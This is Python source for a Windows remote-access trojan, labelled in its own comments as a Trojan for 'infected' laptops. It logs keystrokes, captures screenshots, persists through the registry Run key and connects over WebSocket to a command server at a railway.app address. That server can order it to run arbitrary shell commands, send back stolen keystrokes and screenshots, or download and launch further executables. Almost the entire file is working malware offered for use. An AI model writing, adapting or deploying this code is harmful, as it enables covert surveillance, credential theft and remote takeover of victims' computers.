#########################################################################################
##### This is just a preview of the code, it will be outdated and probably not work #####
#########################################################################################

import os
import winreg as reg
import pyautogui
from pynput import keyboard
import json
import requests
import threading
import time
import uuid
import asyncio
import websockets

# Configuration
C2_SERVER_URL = 'wss://owfstest1.up.railway.app/'  # Update to your server's WebSocket URL

# Global variable for WebSocket
ws = None

# Register the Trojan to run at startup
def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "win_sys_monitor", 0, reg.REG_SZ, os.path.realpath(__file__))
        reg.CloseKey(key)
        print("Successfully added to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

# Keylogger
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f'{key}\n')

def start_keylogger():
    print("Starting keylogger...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot function
def take_screenshot():
    print("Taking screenshot...")
    screenshot = pyautogui.screenshot()
    screenshot_filename = f'screenshot_{int(time.time())}.png'
    screenshot.save(screenshot_filename)
    print(f"Screenshot saved as {screenshot_filename}")
    send_file_to_c2(screenshot_filename)  # Send screenshot back to C2

# WebSocket connection to the C2 server
async def on_message(message):
    print(f"Message received from C2: {message}")
    command = json.loads(message)
    await process_command(command)

async def on_open():
    global ws
    client_id = str(uuid.uuid4())  # Generate a unique ID for this infected laptop
    role = "infected"  # Specify the role of this client
    print("Successfully connected to C2 server.")
    initial_message = json.dumps({"role": role, "id": client_id})
    await ws.send(initial_message)  # Send the role and ID to the server

async def connect_to_c2():
    global ws

    print("Connecting to C2 server...")
    async with websockets.connect(C2_SERVER_URL) as websocket:
        ws = websocket
        await on_open()  # Send initial message after connection is established

        while True:
            try:
                message = await ws.recv()
                await on_message(message)
            except websockets.ConnectionClosed:
                print("Connection closed")
                break
            except Exception as e:
                print(f"Error receiving message: {e}")

async def process_command(command):
    try:
        command_type = command['type']
        print(f"Processing command: {command_type}")
        if command_type == 'screenshot':
            take_screenshot()
        elif command_type == 'execute':
            print(f"Executing command: {command['command']}")
            os.system(command['command'])
        elif command_type == 'download':
            print(f"Downloading additional payload from: {command['url']}")
            download_additional_payload(command['url'])
        elif command_type == 'send_keystrokes':
            with open("keylog.txt", "r") as f:
                keystrokes = f.read()
                send_data_to_c2('keystrokes', keystrokes)
                print("Sent keystrokes to C2.")
    except Exception as e:
        print(f"Error processing command: {e}")

# Send screenshot or other files back to the C2 server
async def send_file_to_c2(file_path):
    try:
        print(f"Sending file to C2: {file_path}")
        with open(file_path, 'rb') as f:
            file_data = f.read()
            # Prepare payload to send the file data
            payload = {
                'type': 'screenshot',
                'filename': os.path.basename(file_path),
                'data': file_data.hex()  # Send as hex string for transmission
            }
            await ws.send(json.dumps(payload))
            print("File sent successfully.")
    except Exception as e:
        print(f"Error sending file to C2: {e}")

# Download additional payloads
def download_additional_payload(url):
    print(f"Downloading additional payload from: {url}")
    response = requests.get(url)
    with open('additional_payload.exe', 'wb') as f:
        f.write(response.content)
    print("Downloaded additional payload.")
    os.startfile('additional_payload.exe')  # Run the new payload

# Send data to the C2 server
async def send_data_to_c2(data_type, data):
    payload = {
        'type': data_type,
        'data': data
    }
    print(f"Sending {data_type} data to C2.")
    await ws.send(json.dumps(payload))

def main():
    # Uncomment the line below to register for auto-startup
    # add_to_startup()
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()  # Start keylogger in a separate thread
    asyncio.run(connect_to_c2())  # Connect to C2 server

if __name__ == "__main__":
    main()
